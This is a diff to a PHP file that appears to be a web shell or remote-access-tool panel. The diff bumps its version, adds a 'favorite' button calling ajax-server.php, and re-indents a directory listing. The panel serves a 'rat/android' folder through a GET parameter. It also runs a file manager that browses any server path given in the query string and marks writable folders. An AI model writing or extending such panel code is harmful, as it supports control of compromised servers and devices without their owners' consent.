@@ -3,7 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-$version = "v2.2";
+$version = "v2.3";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -53,6 +53,7 @@ else {
 #bar_blank, #hidden_iframe {
     display: none;
 }
+
 
 body{
 background-color: black;
@@ -946,7 +947,12 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             xhr.send();
         }
         function favorite(name) {
-            alert("ntar bikinya!");
+            var encname = encodeURIComponent(name).replace("%20","+");
+
+            window.open(
+                    "ajax-server.php?idexl=musfavorite:"+encname,
+                    "_blank"
+                );
         }
         function edit(name) {
             var encname = encodeURIComponent(name).replace("%20","+");
@@ -1350,31 +1356,30 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                 
             //show dir
             echo '<tr>
-            <td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
-            
+            <td ><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
 
-                        //echo '<td><center>xxx--</center></td>';
-                        $jpath = 0;
-                        $jfile = 0;
-                        foreach(scandir($path.'/'.$dir) as $zdir)
-                        {
-                            if ($zdir != '.' && $zdir != '..')
-                            {
-                               $pbusy = $path.'/'.$dir.'/'.$zdir;
-                               if (is_dir($pbusy))
-                                   $jpath += 1;
-                               else
-                                   $jfile += 1;
-                            }
-                        }
-                        if ($jpath == 0 && $jfile == 0)
-                           echo '<td><center><font color="yellow">'.$jpath.' dir / '.$jfile.' file</font></center></td>';
-                        else
-               echo '<td><center>'.$jpath.' dir / '.$jfile.' file</center></td>';
+            //echo '<td><center>xxx--</center></td>';
             $jpath = 0;
-                        $jfile = 0;
+            $jfile = 0;
+            foreach(scandir($path.'/'.$dir) as $zdir)
+            {
+                if ($zdir != '.' && $zdir != '..')
+                {
+                    $pbusy = $path.'/'.$dir.'/'.$zdir;
+                    if (is_dir($pbusy))
+                        $jpath += 1;
+                    else
+                        $jfile += 1;
+                }
+            }
+            if ($jpath == 0 && $jfile == 0)
+                echo '<td><center><font color="yellow">'.$jpath.' dir / '.$jfile.' file</font></center></td>';
+            else
+                echo '<td><center>'.$jpath.' dir / '.$jfile.' file</center></td>';
+            $jpath = 0;
+            $jfile = 0;
 
-                        echo '<td><center>';
+            echo '<td><center>';
                                             
             if(is_writable($path.'/'.$dir)) echo '<font color="green">';
             elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
